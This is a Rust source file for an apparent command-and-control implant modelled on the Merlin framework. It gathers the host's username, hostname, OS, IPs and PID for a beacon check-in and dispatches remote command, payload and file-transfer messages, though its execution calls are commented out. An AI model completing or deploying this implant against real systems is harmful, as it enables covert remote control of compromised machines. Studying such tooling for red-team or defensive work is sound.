
//LCOAL IMPORTS
use crate::messages::messages::*;
use crate::user::comms::*;

// DEPENDENCIES
use uuid::Uuid;
use std::time;
use sys_info;
use std::env::consts::ARCH;
use whoami;
use std::process;
use serde_json;
use serde::{Deserialize, Serialize};
use std::fs;
use std::process::Command;
use std::str;
use std::io::{self, Write};
use std::path::Path;
use std::env;
use log::*;
use async_std::task;
use async_std::prelude::*;
use std::thread;
use tokio;
use async_std::net::TcpStream;
use bincode::*;
use byteorder::*;
use lazy_static::lazy_static;
use std::sync::Mutex;


const CREATE_NO_WINDOW: u32 = 0x08000000;
const DETACHED_PROCESS: u32 = 0x00000008;

lazy_static! {
    pub static ref AGENT: Mutex<Agent> = Mutex::new(Agent::default());
}


#[derive(Default, Clone)]
pub struct Agent  {
	pub id:            Uuid,       // ID is a Universally Unique Identifier per agent
	pub platform:      String,          // Platform is the operating system platform the agent is running on (i.e. windows)
	pub architecture:  String,          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	pub username:      String,          // UserName is the username that the agent is running as
	pub hostname:      String,          // HostName is the computer's host name
    pub os_type:       String,
    pub ips:           Vec<String>,        // Ips is a slice of all the IP addresses assigned to the host's interfaces
	pub pid:           u32,             // Pid is the Process ID that the agent is running under
	pub icheckin:      Option<time::Instant>,       // iCheckIn is a timestamp of the agent's initial check in time
	pub scheckin:      Option<time::Instant>,       // sCheckIn is a timestamp of the agent's last status check in time
	pub version:       String,          // Version is the version number of the Merlin Agent program
	pub build:         String,          // Build is the build number of the Merlin Agent program
	pub waittime:      time::Duration,   // WaitTime is how much time the agent waits in-between checking in
	pub maxretry:      i8,             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	pub failedcheckin: i8,             // FailedCheckin is a count of the total number of failed check ins
	pub skew:          i64,           // Skew is size of skew added to each WaitTime to vary check in attempts
	pub proto:         String,          // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
	pub initial:       bool,            // initial identifies if the agent has successfully completed the first initial check in
	pub killdate:       i64,           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
	pub secret:         Vec<u8>,          // secret is used to perform symmetric encryption operations
    pub psk:            String,          // Pre-Shared Key
}

pub fn new_agent() -> Agent{

    let mut agent = Agent::default();

    agent.id = uuid::Uuid::new_v4();
    agent.platform = sys_info::os_type().unwrap();
    agent.architecture = ARCH.to_string();
    agent.username = whoami::username();
    agent.hostname = whoami::hostname();
    agent.pid     = process::id();
    agent.waittime = time::Duration::from_millis(30000);
    agent.maxretry = 7;
    agent.killdate = 0;
    agent.os_type = whoami::distro_os().to_os_string().into_string().unwrap();

    let mut ip_addrs = Vec::new();
    for iface in get_if_addrs::get_if_addrs().unwrap() {
        ip_addrs.push(iface.ip().to_string())
    }
    agent.ips = ip_addrs;


    *AGENT.lock().unwrap() = agent.clone();

    return agent;
}

pub fn initial_checkin(agent: Agent) -> BaseMessage{


    let mut sinfo = SysInfo::default();
    sinfo.platform = agent.platform;
    sinfo.architecture = agent.architecture;
    sinfo.username = agent.username;
    sinfo.hostname = agent.hostname;
    sinfo.pid = agent.pid;
    sinfo.ips = agent.ips;

    let mut aginfo = AgentInfo::default();
    aginfo.os_version = agent.os_type;
    aginfo.wait_time = agent.waittime;
    aginfo.failedcheckin = 0;
    aginfo.proto = agent.proto;
    aginfo.sysinfo = sinfo;
    aginfo.killdate = agent.killdate;

    let mut basemsg = BaseMessage::default();
    basemsg.id = agent.id;
    basemsg.payload_type = "InitialCheckin".to_string();
    basemsg.agent_info = aginfo;

    return basemsg;

}

async fn status_checkin(agent: Agent){
    let mut smsg = BaseMessage::default();
    smsg.id = agent.id;
    smsg.payload_type = "StatusCheckIn".to_string();
    send_message(smsg).await;

}

pub async fn handle_msg(msg: BaseMessage) -> BaseMessage{
    let mut returnmsg = BaseMessage::default();
    let ptype = msg.payload_type.as_str();

    match ptype {
        "ServerOk" => {
            returnmsg.payload_type = "NoAction".to_string();
            return returnmsg;
        }

        "Alert" => {
            returnmsg.payload_type = "NoAction".to_string();
            return returnmsg;
        }
        "Module" => {
            //modules(msg.module.clone()).await;
            return returnmsg;
        }
        "AgentControl" => {

            return returnmsg;
        }

        "NativeCmd" => {
            /*
            let cmdresult_msg = exec_native_cmd(msg.native_cmd.clone());
            returnmsg.payload_type = "CmdResult".to_string();
            returnmsg.cmd_result = cmdresult_msg;
            */
            return returnmsg;
        }
        "FileTransfer" => {

            return returnmsg;
        }
        "CmdPayload" => {
            /*
            let cmdresult_msg = exec_cmds(msg.cmd_payload.clone());
            returnmsg.payload_type = "CmdResult".to_string();
            returnmsg.cmd_result = cmdresult_msg;
            */
            return returnmsg;
        }

        _ => {
            returnmsg.payload_type = "NoAction".to_string();
            return returnmsg;
        }
    }

}